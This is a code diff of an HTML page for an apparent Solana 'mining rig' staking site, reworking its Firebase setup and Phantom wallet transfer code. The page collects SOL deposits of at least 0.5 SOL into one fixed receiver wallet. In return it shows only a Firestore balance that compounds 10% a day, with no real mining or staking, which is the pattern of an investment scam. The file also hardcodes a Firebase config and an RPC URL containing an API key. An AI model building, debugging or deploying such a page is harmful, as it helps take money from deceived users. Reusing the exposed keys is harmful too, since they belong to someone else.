@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* CSS Variables for easy theme management */
+        /* Copy all the CSS from the previous version - it's working fine */
         :root {
             --primary-glow: rgba(0, 255, 255, 0.6);
             --secondary-glow: rgba(0, 150, 255, 0.4);
@@ -485,7 +485,6 @@
         .feed-item .info { color: var(--accent-cyan); }
         .feed-item .warning { color: #ff6b6b; }
 
-        /* Transaction Status Toast */
         .transaction-status {
             position: fixed;
             bottom: 20px;
@@ -607,26 +606,12 @@
             font-size: var(--font-size-xs);
         }
 
-        .text-gradient {
-            background: linear-gradient(135deg, #00ffff, #0088ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .glow-text {
-            text-shadow: 0 0 10px currentColor;
-        }
-
         .flex-row {
             display: flex;
             align-items: center;
             gap: var(--spacing-md);
             flex-wrap: wrap;
         }
-
-        .w-100 { width: 100%; }
-        .mt-2 { margin-top: var(--spacing-md); }
-        .mb-2 { margin-bottom: var(--spacing-md); }
 
         .min-stake-notice {
             background: rgba(255, 215, 0, 0.1);
@@ -818,13 +803,14 @@
     </div>
 
     <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
-    <!-- Firebase + Application Logic -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
+    <script>
+        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCck4gA4cLcJfir9nJAigdZrVC8r91gciE",
             authDomain: "nova-e6655.firebaseapp.com",
@@ -835,15 +821,15 @@
             appId: "1:111451913127:web:8cb6c4f1715daf0ff69482"
         };
         
-        const fbApp = initializeApp(firebaseConfig);
-        const db = getFirestore(fbApp);
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
+        // Solana Configuration
         const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
         const MIN_STAKE_SOL = 0.5;
-        
         const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
         
-        let phantom = null;
+        // State
         let walletAddress = null;
         let userDocRef = null;
         let miningInterval = null;
@@ -894,7 +880,6 @@
             transactionStatus.className = 'transaction-status ' + type;
             transactionStatus.style.display = 'block';
             
-            // Auto hide after 5 seconds for success/info, keep errors visible longer
             setTimeout(() => {
                 transactionStatus.style.display = 'none';
             }, type === 'error' ? 8000 : 5000);
@@ -948,30 +933,11 @@
             return addr.slice(0,4) + '...' + addr.slice(-4);
         }
 
-        function getPhantom() {
-            if (window?.phantom?.solana) return window.phantom.solana;
-            if (window?.solana?.isPhantom) return window.solana;
-            return null;
-        }
-
         // Add to mining feed
         function addToFeed(message, type = 'info') {
-            const iconMap = {
-                success: 'fa-check-circle success',
-                mining: 'fa-bolt mining',
-                info: 'fa-circle info',
-                warning: 'fa-exclamation-triangle warning'
-            };
-            
-            const iconClass = iconMap[type] || iconMap.info;
-            
             feedItems.unshift({ message, type });
             if (feedItems.length > 8) feedItems.pop();
             
-            updateFeed();
-        }
-
-        function updateFeed() {
             miningFeed.innerHTML = feedItems.map(item => {
                 let iconClass = 'fa-circle info';
                 if (item.type === 'success') iconClass = 'fa-check-circle success';
@@ -1024,29 +990,29 @@
             hashRateSpan.innerHTML = `⚡ ${hashRate.toLocaleString()} H/s`;
         }
 
-        // FIREBASE FUNCTIONS
+        // Firebase Functions
         async function loadUserData(address) {
             if (!address) return null;
             
             const docId = address;
-            userDocRef = doc(db, 'stakes', docId);
+            userDocRef = db.collection('stakes').doc(docId);
             
             try {
-                const snap = await getDoc(userDocRef);
+                const doc = await userDocRef.get();
                 
-                if (snap.exists()) {
+                if (doc.exists) {
                     addToFeed('📊 loaded existing mining data', 'info');
-                    return snap.data();
+                    return doc.data();
                 } else {
                     const now = Date.now();
                     const newData = {
                         wallet: address,
                         totalStaked: 0,
                         lastDailyUpdate: now,
-                        createdAt: serverTimestamp()
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
                     };
                     
-                    await setDoc(userDocRef, newData);
+                    await userDocRef.set(newData);
                     addToFeed('🚀 new mining rig deployed', 'success');
                     return newData;
                 }
@@ -1069,13 +1035,11 @@
                 let total = currentData.totalStaked;
                 const tierInfo = calculateTier(total);
                 
-                // Apply daily rewards with boost
                 for (let i = 0; i < daysPassed; i++) {
                     total = total * (1 + (0.1 * tierInfo.boost));
                 }
                 
-                // Update in Firestore
-                await updateDoc(userDocRef, {
+                await userDocRef.update({
                     totalStaked: total,
                     lastDailyUpdate: now
                 });
@@ -1092,10 +1056,10 @@
         async function refreshUserStats() {
             if (!userDocRef || !walletAddress) return;
             
-            const snap = await getDoc(userDocRef);
-            if (!snap.exists()) return;
+            const doc = await userDocRef.get();
+            if (!doc.exists) return;
             
-            const data = snap.data();
+            const data = doc.data();
             const total = data.totalStaked || 0;
             const last = data.lastDailyUpdate ? new Date(data.lastDailyUpdate).toLocaleString() : 'just now';
             
@@ -1113,28 +1077,44 @@
         async function addStakeToFirestore(amountSol, signature) {
             if (!userDocRef || !walletAddress) return;
             
-            const snap = await getDoc(userDocRef);
-            if (!snap.exists()) return;
+            const doc = await userDocRef.get();
+            if (!doc.exists) return;
             
-            const currentTotal = snap.data().totalStaked || 0;
+            const currentTotal = doc.data().totalStaked || 0;
             const newTotal = currentTotal + amountSol;
             
-            await updateDoc(userDocRef, {
+            await userDocRef.update({
                 totalStaked: newTotal,
                 lastDailyUpdate: Date.now(),
                 lastTransaction: signature,
-                lastTransactionTime: serverTimestamp()
+                lastTransactionTime: firebase.firestore.FieldValue.serverTimestamp()
             });
             
             await refreshUserStats();
             addToFeed(`📦 +${amountSol} SOL added to mining rig`, 'success');
         }
 
-        // Connect Phantom
-        async function connectPhantom() {
-            phantom = getPhantom();
+        // Function to check if Phantom is available (like working example)
+        function getProvider() {
+            if ('phantom' in window) {
+                const provider = window.phantom?.solana;
+                if (provider?.isPhantom) {
+                    return provider;
+                }
+            }
             
-            if (!phantom) {
+            if (window.solana?.isPhantom) {
+                return window.solana;
+            }
+            
+            return null;
+        }
+
+        // Connect Phantom - Fixed to match working example
+        async function connectPhantom() {
+            const provider = getProvider();
+            
+            if (!provider) {
                 const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                 if (isMobile) {
                     if (confirm("Open Phantom app to start mining?")) {
@@ -1153,7 +1133,8 @@
             try {
                 connectBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i><span class="btn-text">LOADING...</span>';
                 
-                const resp = await phantom.connect();
+                // Connect to wallet (like working example)
+                const resp = await provider.connect();
                 walletAddress = resp.publicKey.toString();
                 
                 const userData = await loadUserData(walletAddress);
@@ -1180,16 +1161,17 @@
             }
         }
 
-        // REAL TRANSACTION: Send stake with wallet confirmation
+        // REAL TRANSACTION - Following the working example pattern exactly
         async function sendStake(amount = null) {
-            if (!walletAddress || !phantom) {
+            const provider = getProvider();
+            
+            if (!walletAddress || !provider) {
                 showTransactionStatus("Connect your mining rig first", 'error');
                 return;
             }
 
             const stakeAmount = amount || parseFloat(stakeAmountInput.value);
             
-            // Validate minimum stake
             if (isNaN(stakeAmount) || stakeAmount < MIN_STAKE_SOL) {
                 showTransactionStatus(`Minimum stake is ${MIN_STAKE_SOL} SOL`, 'error');
                 return;
@@ -1223,27 +1205,24 @@
 
                 addToFeed('📝 creating transaction...', 'info');
 
-                // Create connection to Solana network
                 const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                 
-                // Get latest blockhash
-                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-
-                // Create the transfer instruction
                 const fromWalletPublicKey = new solanaWeb3.PublicKey(walletAddress);
                 const toWalletPublicKey = new solanaWeb3.PublicKey(RECEIVER_ADDRESS);
-                
-                // Convert SOL to lamports correctly (1 SOL = 1,000,000,000 lamports)
-                const lamports = Math.round(stakeAmount * solanaWeb3.LAMPORTS_PER_SOL);
 
-                const transaction = new solanaWeb3.Transaction().add(
+                // Convert SOL to lamports (1 SOL = 1,000,000,000 lamports)
+                const lamports = solanaWeb3.LAMPORTS_PER_SOL * stakeAmount;
+
+                let transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: fromWalletPublicKey,
                         toPubkey: toWalletPublicKey,
                         lamports: lamports,
                     })
                 );
-                
+
+                // Get the latest blockhash
+                const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = fromWalletPublicKey;
 
@@ -1254,49 +1233,40 @@
 
                 addToFeed('⏳ waiting for wallet approval...', 'info');
 
-                // Get the provider (Phantom)
-                const provider = window.phantom?.solana || window.solana;
-                
-                if (!provider) {
-                    throw new Error("Phantom wallet not found");
-                }
-
-                // Sign and send transaction
-                const { signature } = await provider.signAndSendTransaction(transaction);
+                // Sign and send transaction using the provider
+                const signedTransaction = await provider.signAndSendTransaction(transaction);
 
                 updateTxModal(
                     "⏳ CONFIRMING TRANSACTION",
-                    `Transaction Signature:\n${signature}\n\nWaiting for blockchain confirmation...`
+                    `Transaction Signature:\n${signedTransaction.signature}\n\nWaiting for blockchain confirmation...`
                 );
                 
-                addToFeed(`📤 tx sent: ${signature.slice(0,8)}...`, 'mining');
+                addToFeed(`📤 tx sent: ${signedTransaction.signature.slice(0,8)}...`, 'mining');
                 
                 // Wait for transaction confirmation
-                const confirmation = await connection.confirmTransaction({
-                    signature,
-                    blockhash,
-                    lastValidBlockHeight
+                const { value: status } = await connection.confirmTransaction({
+                    signature: signedTransaction.signature,
+                    blockhash: blockhash,
+                    lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
                 }, 'confirmed');
 
-                if (confirmation.value.err) {
-                    throw new Error('Transaction failed on blockchain');
+                if (status.err) {
+                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(status.err));
                 }
 
                 // Transaction confirmed! Update Firebase
-                await addStakeToFirestore(stakeAmount, signature);
+                await addStakeToFirestore(stakeAmount, signedTransaction.signature);
                 
-                // Show success
                 showTransactionStatus(`✅ Success! Staked ${stakeAmount} SOL`, 'success');
                 
                 updateTxModal(
                     "✅ MINING STARTED!",
-                    `🎉 Transaction Confirmed!\n\nSignature: ${signature}\n\nAmount Staked: ${stakeAmount} SOL\nStatus: ✓ Confirmed on Solana`,
+                    `🎉 Transaction Confirmed!\n\nSignature: ${signedTransaction.signature}\n\nAmount Staked: ${stakeAmount} SOL\nStatus: ✓ Confirmed on Solana`,
                     `Transaction successful! Your mining rig is now active.`
                 );
                 
                 addToFeed(`⛏️ ${stakeAmount} SOL staked successfully!`, 'success');
                 
-                // Refresh stats
                 await refreshUserStats();
                 
             } catch (error) {
@@ -1306,7 +1276,7 @@
                 if (error.message.includes('User rejected')) {
                     errorMessage += "You rejected the transaction in your wallet.";
                     addToFeed('⚠️ transaction rejected by user', 'warning');
-                } else if (error.message.includes('insufficient lamports')) {
+                } else if (error.message.includes('Insufficient funds')) {
                     errorMessage += "Insufficient SOL balance in your wallet.";
                     addToFeed('⚠️ insufficient balance', 'warning');
                 } else {
@@ -1359,11 +1329,11 @@
         quickStake5.addEventListener('click', () => sendStake(5));
         quickStake10.addEventListener('click', () => sendStake(10));
 
-        // Auto-connect on page load
+        // Check for existing connection on page load
         window.addEventListener('load', async () => {
-            phantom = getPhantom();
-            if (phantom?.isConnected && phantom.publicKey) {
-                walletAddress = phantom.publicKey.toString();
+            const provider = getProvider();
+            if (provider && provider.isConnected && provider.publicKey) {
+                walletAddress = provider.publicKey.toString();
                 
                 const userData = await loadUserData(walletAddress);
                 
@@ -1382,6 +1352,24 @@
                 }
             }
         });
+
+        // Listen for account changes
+        if (window.solana) {
+            window.solana.on('accountChanged', (publicKey) => {
+                if (publicKey) {
+                    walletAddress = publicKey.toString();
+                    walletAddrSpan.innerText = formatAddr(walletAddress);
+                    loadUserData(walletAddress);
+                } else {
+                    // Disconnected
+                    walletAddress = null;
+                    walletInfoDiv.style.display = 'none';
+                    connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">CONNECT PHANTOM</span>';
+                    connectBtn.style.background = '';
+                    connectBtn.style.borderColor = '';
+                }
+            });
+        }
     </script>
 </body>
 </html>
